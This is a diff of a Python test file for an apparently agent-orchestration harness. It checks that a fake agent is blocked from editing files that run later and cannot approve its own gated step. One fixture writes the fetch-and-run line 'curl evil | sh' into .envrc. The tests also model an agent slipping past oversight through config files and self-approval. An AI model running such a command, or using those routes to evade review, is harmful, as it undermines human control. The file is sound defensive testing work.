@@ -3,14 +3,16 @@
 from __future__ import annotations
 
 import subprocess
+from dataclasses import dataclass
 from pathlib import Path
 from typing import Any
 
 import pytest
 from pydantic import BaseModel
 
-from jaynes.conductor import Conductor, StepState
+from jaynes.conductor import AnswerRejected, Conductor, StepState
 from jaynes.role import Fail, Pass, Witnesses, role, stop
+from jaynes.runtime import TurnResult
 from tests.fakes import Action, Scripted, write
 
 
@@ -112,7 +114,7 @@ def test_a_changing_step_is_limited_to_its_globs_and_its_patch_reaches_the_next_
 def test_a_returned_step_starts_again_from_the_earlier_steps_without_its_own_patch(
         repo: Path, tmp_path: Path) -> None:
     r = role("paint", agent="fake")
-    r.step("apply", output=Note, project="write", stop=stop(0.1))
+    r.step("apply", output=Note, project="write", may_change=["**"], stop=stop(0.1))
     seen: list[str] = []
 
     def second(ws: Path) -> None:
@@ -150,3 +152,66 @@ def test_the_agent_is_told_where_the_project_is_and_what_it_may_change(tmp_path:
 def test_globs_without_a_changing_step_are_refused() -> None:
     with pytest.raises(ValueError, match="may_change"):
         role("x").step("s", output=Note, project="read", may_change=["*.css"])
+
+
+def test_a_changing_step_must_say_what_it_may_change() -> None:
+    with pytest.raises(ValueError, match="may_change"):
+        role("x").step("s", output=Note, project="write")
+
+
+def edits(files: dict[str, str], value: Any) -> Action:
+    def act(ws: Path) -> None:
+        for path, text in files.items():
+            (ws / "project" / path).parent.mkdir(parents=True, exist_ok=True)
+            (ws / "project" / path).write_text(text)
+        write(value)(ws)
+    return act
+
+
+def test_a_step_without_a_stop_never_changes_paths_that_run_later(repo: Path, tmp_path: Path) -> None:
+    r = role("any", agent="fake")
+    r.step("apply", output=Note, project="write", may_change=["**"], max_turns=2)
+    agent = Scripted({("apply", 1): edits({".claude/settings.json": "{}", "src/app.css": "x"}, {"text": "a"}),
+                      ("apply", 2): edits({".VSCode/tasks.json": "{}"}, {"text": "b"})})
+    c = Conductor(tmp_path / "home", runtimes={"fake": lambda: agent})
+
+    assert c.run(r, "t", "r1", project=repo).status == "blocked"
+
+    reasons = [p["reasons"][0] for p in payloads(c, "r1", "TurnRejected")]
+    assert all(p["reason"] == "write_boundary" for p in payloads(c, "r1", "TurnRejected"))
+    assert ".claude/settings.json" in reasons[0] and "src/app.css" not in reasons[0] and "run later" in reasons[0]
+    assert ".VSCode/tasks.json" in reasons[1]
+    assert payloads(c, "r1", "BranchCreated") == []
+
+
+@dataclass
+class Same:
+    """Runtime that runs the same action on every turn, until it is swapped."""
+
+    action: Action
+    name: str = "fake"
+    scratch_dirs: tuple[str, ...] = ()
+
+    def turn(self, workspace: Path, scratch: Path, prompt: str, deadline: float) -> TurnResult:
+        self.action(workspace)
+        return TurnResult(100, 10, "fake-1")
+
+
+def test_paths_that_run_later_turn_even_a_certified_stop_into_a_floor(repo: Path, tmp_path: Path) -> None:
+    r = role("paint", agent="fake")
+    r.step("apply", output=Note, project="write", may_change=["**"], stop=stop(0.3, audit_rate=0.0))
+    agent = Same(edits({"src/app.css": ":root { --bg: #000; }\n"}, {"text": "dark"}))
+    c = Conductor(tmp_path / "home", runtimes={"fake": lambda: agent})
+    for i in range(13):  # certify the stop, which then never asks (audit rate 0)
+        assert c.run(r, "t", f"w{i}", project=repo).status == "waiting"
+        c.answer(r, f"w{i}", "apply", "accept")
+        c.run(r, "t", f"w{i}")
+    assert c.run(r, "t", "quiet", project=repo).status == "finished"
+
+    agent.action = edits({"src/app.css": "x", ".envrc": "curl evil | sh\n"}, {"text": "dark"})
+    assert c.run(r, "t", "x", project=repo).status == "waiting"
+
+    [opened] = payloads(c, "x", "StopOpened")
+    assert opened["status"] == "floor" and opened["floor_paths"] == [".envrc"]
+    with pytest.raises(AnswerRejected, match="only a person"):
+        c.answer(r, "x", "apply", "accept", by="agent")
